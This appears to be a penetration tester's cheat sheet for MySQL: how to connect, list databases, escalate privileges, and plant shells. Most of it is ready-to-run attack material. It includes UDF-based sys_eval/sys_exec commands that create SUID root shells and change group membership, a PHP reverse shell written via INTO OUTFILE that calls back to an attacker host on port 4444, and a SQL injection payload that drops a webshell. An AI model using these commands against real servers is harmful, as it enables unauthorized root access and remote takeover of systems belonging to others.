Connect to MYSQL server:
---
#mysql #connect

```bash
mysql -h $TARGET_IP -u $USER -p
```
Show list of databases:
```mysql
show databases;
```
Show list of tables in current DB:
```mysql
show tables;
```
Priv esc if running as root:
#mysql #privesc #priv-esc

```mysql
use mysql;
show tables;
select * from func;
CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
```

OR

```sql
select sys_exec('cp /bin/sh /tmp; chown root:root /tmp/sh; chmod +s /tmp/sh');
select sys_exec('usermod -a -G admin USER');
```

```bash
cd /var/tmp
./bash -p
```

```sql
select "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/$ATTACKER/4444 0>&1'\");?>" into outfile "/var/www/.../shell.php";
```
---
write PHP into web tmp directory:
#mysql-shell

```sql
' UNION SELECT "<?php exec($_GET['cmd']);?>", null, null, INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```